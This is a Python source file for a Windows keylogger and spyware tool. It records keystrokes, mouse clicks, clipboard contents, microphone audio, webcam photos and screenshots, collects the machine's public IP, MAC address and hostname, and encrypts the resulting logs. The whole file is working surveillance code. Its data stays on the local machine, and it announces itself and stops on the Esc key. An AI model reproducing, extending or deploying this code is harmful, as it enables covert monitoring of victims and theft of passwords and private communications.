############################################################# IMPORT STATEMENTS #############################################################

import logging
import requests
import threading
import pyaudio
import wave
import win32clipboard
import time
import platform
import socket
import re
import uuid
import psutil
import os
import cv2
import pathlib


from pynput import keyboard, mouse
from pynput.keyboard import Key
from cryptography.fernet import Fernet
from PIL import ImageGrab



############################################################# INITIALIZATION #############################################################

# Constants
SCREEN = 'Screenshots'
WEBCAM= 'WebcamPics'
LOG_FILE = "keylogfile.txt"
CLIPBOARD = "clipboard.txt"
WAVE_OUTPUT_FILENAME = "output.wav"
ZIP = "test.zip"
CHUNK = 4096
FORMAT = pyaudio.paInt32
CHANNELS = 2
RATE = 48000


#Initialize PyAudio
audio = pyaudio.PyAudio()

#Event to control Threads
stop_thread = threading.Event()


############################################################# RETRIEVE INFORMATION #############################################################

#Setup logs files
def setup_logging():
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')


#Get system information
def get_system_info():
    info = {}
    try:
        response = requests.get('https://ipinfo.io/ip')
        info['Public IP Address'] = response.text.strip()
    except requests.RequestException as e:
        info['Public IP Address'] = f"Unable to get the Public IP Address: {str(e)}"
    
    info['System'] = f"{platform.system()} {platform.version()}"
    info['Architecture'] = platform.machine()
    info['Hostname'] = socket.gethostname()
    info['Private IP Address'] = socket.gethostbyname(socket.gethostname())
    info['MAC Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    info['Processor'] = platform.processor()
    info['RAM'] = f"{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB"

    return info

# Log system information
def log_system_info():
    info = get_system_info()
    for key, value in info.items():
        logging.info(f"{key}: {value}")
    logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")


# Handler for key press event
def on_press(key):
    logging.info(f"[Key Pressed] - {key}")


# Handler for mouse click event
def on_click(button, pressed):
    if pressed:
        if button == mouse.Button.left:
            logging.info('[Mouse Click] - Left Click')
        elif button == mouse.Button.right:
            logging.info('[Mouse Click] - Right Click')
        elif button == mouse.Button.middle:
            logging.info('[Mouse Click] - Middle Click')


# Stop the script
def on_release(key):
    if key == Key.esc:
        print("Stopping the script.")
        stop_thread.set()
        return False


# Audio Recording
def Audio():
    try:
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)

            print("Audio recording started. Press 'Esc' to stop.")
            while not stop_thread.is_set():
                data = stream.read(CHUNK)
                wf.writeframes(data)
        
        stream.stop_stream()
        stream.close()
    except Exception as e:
        logging.error(f"Error occurred while recording audio: {e}")
    finally:
        audio.terminate()


# Capture images from webcam
def webcam():
    try:
        pathlib.Path(WEBCAM).mkdir(parents=True, exist_ok=True)
        cam_path = 'WebcamPics\\'
        cam = cv2.VideoCapture(0)
        for x in range(0, 10):
            ret, img = cam.read()
            file = (cam_path + '{}.jpg'.format(x))
            cv2.imwrite(file, img)
            time.sleep(10)
            if stop_thread.is_set():
                break  # Break the loop if the stop flag is set

        cam.release()  # Properly release the camera
        cv2.destroyAllWindows()  # Close OpenCV windows

    except Exception as e:
        print("WebcamPics could not be saved: " + str(e))


# Monitor clipboard
def clipboard():
    previous_clipboard_data = ""  # Store the previous clipboard content
    
    try:
        while not stop_thread.is_set():
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            # Check if clipboard content has changed
            if pasted_data != previous_clipboard_data:
                with open(CLIPBOARD, "a") as file:
                    file.write("Clipboard Data : \n")
                    file.write(str(pasted_data) + "\n")
                    file.write("\n")
                previous_clipboard_data = pasted_data

            # Add a small delay to avoid high CPU usage
            time.sleep(1)

    except Exception as e:
        with open(CLIPBOARD, "a") as file:
            file.write("\n Clipboard could not be copied: " + str(e) + "\n")


# Screenshot
def screenshot():
    try:
        while not stop_thread.is_set():
            pathlib.Path(SCREEN).mkdir(parents=True, exist_ok=True)
            screen_path = 'Screenshots\\'

            for x in range(0,10):
                pic = ImageGrab.grab()
                pic.save(screen_path + 'screenshot{}.png'.format(x))
                time.sleep(5)
                if stop_thread.is_set():
                    break  # Break the loop if the stop flag is set

    except Exception as e:
        print("Screenshots could not be saved: " + str(e))


############################################################# FILES CREATION #############################################################


# Encrypt files
def encrypt(file_path):
    # Load the key from the file
    with open('keyfile.key', 'rb') as filekey:
        key = filekey.read()

    # Load the content of the file
    with open(file_path, 'rb') as inputfile:
        original = inputfile.read()

    # Encrypt the content
    fernet = Fernet(key)
    encrypted = fernet.encrypt(original)

    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

# Main function
def main():
    try:
        setup_logging()
        log_system_info()

        # Start threads for clipboard, webcam, and audio recording

        t1 = threading.Thread(target=clipboard)
        t2 = threading.Thread(target=webcam)
        t3 = threading.Thread(target=Audio)
        t4 = threading.Thread(target=screenshot)
        t5 = threading.Thread(target=log_system_info)


        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()


        # Start the keyboard and mouse listeners
        with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, \
             mouse.Listener(on_click=on_click) as mouse_listener:
            print("Script started. Press 'Esc' to stop.")
            key_listener.join()
            mouse_listener.stop()

        # Encrypt the LOG_FILE and CLIPBOARD
        encrypt(LOG_FILE)
        encrypt(CLIPBOARD)

        # Print the paths of encrypted files
        print("Encrypted LOG_FILE:", LOG_FILE)
        print("Encrypted CLIPBOARD:", CLIPBOARD)

    except Exception as e:
        logging.exception(f"An error occurred: {str(e)}")

    finally:
        # Ensure stop_thread is set and threads are joined
        stop_thread.set()
        t1.join()
        t2.join()
        t3.join()
        t4.join()
        t5.join()

if __name__ == '__main__':
    try:
        if os.path.exists("keyfile.key"):
            main()
        else:
            print("You forgot to generate the Key x)")

    except KeyboardInterrupt:
        print("Control-C entered... Program exiting")


        